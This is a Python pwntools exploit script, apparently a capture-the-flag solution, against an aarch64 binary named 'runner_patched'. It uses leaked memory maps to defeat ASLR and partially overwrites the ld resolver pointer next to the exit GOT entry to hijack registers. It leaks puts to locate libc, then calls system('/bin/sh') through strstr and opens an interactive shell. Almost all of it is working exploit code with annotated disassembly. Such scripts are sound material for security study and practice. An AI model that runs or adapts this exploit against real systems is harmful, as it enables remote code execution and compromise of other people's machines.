#!/usr/bin/env python3
from pwn import (
    p64, context, process, remote, gdb, args, log, ELF, cyclic
)

context(terminal=['tmux', 'split-pane', '-vb', '-p80'])
context(os="linux", arch="aarch64")

elf = context.binary = ELF('./runner_patched')
libc = ELF(args.libc) if args.libc else elf.libc
ld = ELF('lib/ld-linux-aarch64.so.1')
host, port = 'somehost', 1337

gs = '\n'.join([
    'set breakpoint pending on',
    # 'b *0x55018441ac',
    'b *$rebase(0x10bcc)',
])


def start():
    with context.quiet:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs, api=True)
        elif args.REMOTE:
            return remote(host, port)
        else:
            return process(elf.path)


def pause():
    if args.GDB:
        io.gdb.interrupt_and_wait()


io = start()

"""
Rebase exe with leaked proc maps data.
"""
maps_data = io.recvuntil(b"exit").strip()
log.info(f"maps_data: {maps_data.decode()}")
maps = maps_data.split(b'\n')
elf_base = int(maps[0].split(b'-')[0], 16)
elf.address = elf_base

log.info(f"elf_base: {elf_base:#x}")

"""
Calculate known addresses.
- ld_resolver_ptr is the address of the ld resolver function pointer
    (it is stored just before the exit GOT entry).
"""
ld_resolver_ptr = elf.got.exit - 8
# new byte to write over ld_resolver_ptr lsb
# (padded to 8 bytes to maintain alignment)
attack_byte = 0xac

log.info(f"LD Resolver ptr: {ld_resolver_ptr:#x}")

"""
Send a status code of 1337 (doesnt seem to matter what it is).
"""
io.sendlineafter(b">\n", b"1337")

"""
Send the address of the ld resolver function pointer (elfbase + 0x21258).
We will overwrite the lsb of this address with 0xac.
This will skip the register stashing before calling sub_0xff90 and cause it
to use some values from our input when reinstating the stack frame.
Specifically it will allow us to x29 and x30 which are the stack frame
pointer and the return address respectively.

============== resolver function from ld @ 0x12184 ==============
00012184  int64_t sub_12184(void* arg1 @ x16, int64_t arg2, int64_t arg3)
  0 @ 00012188  sp = sp - 0xd0           <--| Original target of resolver
                                            | function pointer.

  1 @ 00012188  [sp {__saved_x8}].q = x8 <--| Skipping this causes stack to be
                                            | 0xd0 bytes higher than intended.
  2 @ 00012188  [sp + 8 {__saved_x9}].q = x9
  3 @ 0001218c  [sp + 0x10 {__saved_x6}].q = x6
  4 @ 0001218c  [sp + 0x18 {__saved_x7}].q = x7
  5 @ 00012190  [sp + 0x20 {__saved_x4}].q = x4
  6 @ 00012190  [sp + 0x28 {__saved_x5}].q = x5
  7 @ 00012194  [sp + 0x30 {__saved_x2}].q = x2
  8 @ 00012194  [sp + 0x38 {__saved_x3}].q = x3
  9 @ 00012198  [sp + 0x40 {__saved_x0}].q = x0
 10 @ 00012198  [sp + 0x48 {__saved_x1}].q = x1
 11 @ 0001219c  [sp + 0x50 {__saved_v0}].o = q0
 12 @ 0001219c  [sp + 0x60 {__saved_v1}].o = q1
 13 @ 000121a0  [sp + 0x70 {__saved_v2}].o = q2
 14 @ 000121a0  [sp + 0x80 {__saved_v3}].o = q3
 15 @ 000121a4  [sp + 0x90 {__saved_v4}].o = q4
 16 @ 000121a4  [sp + 0xa0 {__saved_v5}].o = q5
 17 @ 000121a8  [sp + 0xb0 {__saved_v6}].o = q6
 18 @ 000121a8  [sp + 0xc0 {__saved_v7}].o = q7
 19 @ 000121ac  x0 = [x16 - 8].q        <--| New target of the ld resolver
                                           | function pointer after single byte
                                           | overwrite.
 20 @ 000121b0  x1 = [sp + 0xd0 {arg2}].q
 21 @ 000121b4  x1 = x1 - x16
 22 @ 000121b8  x1 = x1 + (x1 << 1)
 23 @ 000121bc  x1 = x1 << 3
 24 @ 000121c0  x1 = x1 - 0xc0
 25 @ 000121c4  x1 = x1 u>> 3
 26 @ 000121c8  call(sub_ff90)
 27 @ 000121cc  x16 = x0               <--| When we arrive back here our
                                          | buffer is at $sp + 0x38.
 28 @ 000121d0  q0 = [sp + 0x50 {__saved_v0}].o
 29 @ 000121d0  q1 = [sp + 0x60 {__saved_v1}].o
 30 @ 000121d4  q2 = [sp + 0x70 {__saved_v2}].o
 31 @ 000121d4  q3 = [sp + 0x80 {__saved_v3}].o
 32 @ 000121d8  q4 = [sp + 0x90 {__saved_v4}].o
 33 @ 000121d8  q5 = [sp + 0xa0 {__saved_v5}].o
 34 @ 000121dc  q6 = [sp + 0xb0 {__saved_v6}].o
 35 @ 000121dc  q7 = [sp + 0xc0 {__saved_v7}].o
 36 @ 000121e0  x0 = [sp + 0x40 {__saved_x0}].q
 37 @ 000121e0  x1 = [sp + 0x48 {__saved_x1}].q
 38 @ 000121e4  x2 = [sp + 0x30 {__saved_x2}].q
 39 @ 000121e4  x3 = [sp + 0x38 {__saved_x3}].q
 40 @ 000121e8  x4 = [sp + 0x20 {__saved_x4}].q
 41 @ 000121e8  x5 = [sp + 0x28 {__saved_x5}].q
 42 @ 000121ec  x6 = [sp + 0x10 {__saved_x6}].q
 43 @ 000121ec  x7 = [sp + 0x18 {__saved_x7}].q
 44 @ 000121f0  x8 = [sp {__saved_x8}].q
 45 @ 000121f0  x9 = [sp + 8 {__saved_x9}].q
 46 @ 000121f0  sp = sp + 0xd0
 47 @ 000121f4  x17 = [sp {arg2}].q
 48 @ 000121f4  x30 = [sp + 8 {arg3}].q
 49 @ 000121f4  sp = sp + 0x10
 50 @ 000121f8  jump(x16)
"""
io.sendlineafter(b">\n", f"{ld_resolver_ptr:08x}".encode())


"""
Arrange the payload
"""

padding = b"\x00" * 0x88

payload = p64(attack_byte)     # $sp + 0x38 - 0x40 Will end up in x3
payload += p64(elf.got.puts)    # $sp + 0x40 - 0x48 Will end up in x0
payload += padding
payload += p64(elf.got.printf)  # $sp + 0xd0 - 0xd8 Will end up in x17

# $sp + 0xd8 - 0xe0 Will end up in x30 (return address)
payload += p64(elf.address + 0x10bcc)  # Back to main loop addr input

io.sendlineafter(b">\n", payload)

puts_leak = io.recvuntil(b"address", drop=True)
puts_leak = int.from_bytes(puts_leak, 'little')
log.info(f"Leaked puts: {puts_leak:#x}")

libc.address = puts_leak - libc.sym.puts

binsh = next(libc.search(b"/bin/sh\0"))

io.sendlineafter(b">\n", f"{ld_resolver_ptr:08x}".encode())

payload = p64(attack_byte)     # $sp + 0x38 - 0x40 Will end up in x3

# $sp + 0x40 - 0x48 Will end up in x0 and x1
payload += p64(binsh)  # x0
payload += p64(binsh)  # x1
payload += padding[:-8]

# Use strstr just because it will return the address
# of a match in x0 which we can force to be a pointer
# to /bin/sh by passing it in x0 and x1.
payload += p64(elf.got.strstr)  # $sp + 0xd0 - 0xd8 Will end up in x17
# $sp + 0xd8 - 0xe0 Will end up in x30 (return address)
payload += p64(libc.sym.system)  # Call system with result of strstr.

io.sendlineafter(b">\n", payload)

io.interactive()
